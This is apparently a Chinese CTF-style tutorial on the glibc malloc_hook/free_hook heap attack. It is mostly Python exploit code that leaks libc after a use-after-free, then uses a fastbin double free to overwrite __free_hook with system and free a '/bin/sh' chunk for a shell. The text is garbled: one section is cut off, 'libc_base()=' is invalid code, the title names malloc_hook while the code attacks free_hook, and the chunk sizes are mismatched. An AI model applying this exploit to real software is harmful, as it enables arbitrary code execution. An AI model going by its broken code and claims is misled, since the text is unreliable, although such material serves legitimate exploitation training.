## 简单介绍
我们这一类漏洞类似于我们的 free-hook 攻击，本质上都是因为我们的 use after free 后派生 2 出来的漏洞。

这里，我们更加方便的一点在于，我们的 malloc_hook 函数一定是在我们的 main_arena 附近的，也就是说，只要我们能够找到一个合适的位置，我们的 libc 地址相对而言是比较好求的



## 用途
通过我们的 malloc

## 流程
第一步：泄露 libc，这一步，我们依然可以按照我们的 use after free 漏洞来执行。
```python
for i in range(10):
	create(i,0x100,b'a')
for i in range(8):
	delete(i)
show (7)
libc_base()=l64()-0x70-libc.sym['__malloc_hook']

system,binsh=get_sb()
free_hook=libc_base+libc.sym['__free_hook']
```


第二步：利用我们的 double_free 漏洞来修改我们的 `hook` 函数

```python
create(10,0x20,b'a')
create(11,0x20,b'a')
delete(11)
delete(10)
delete(11)#double free

create(12,0x10,p64(free_hook))
create(13,0x20,b'a')# 垃圾数据
create(14,0x20,b'/bin/sh\x00')# 本质上是垃圾数据
create(15,0x20,p64(system))
delete(14)
```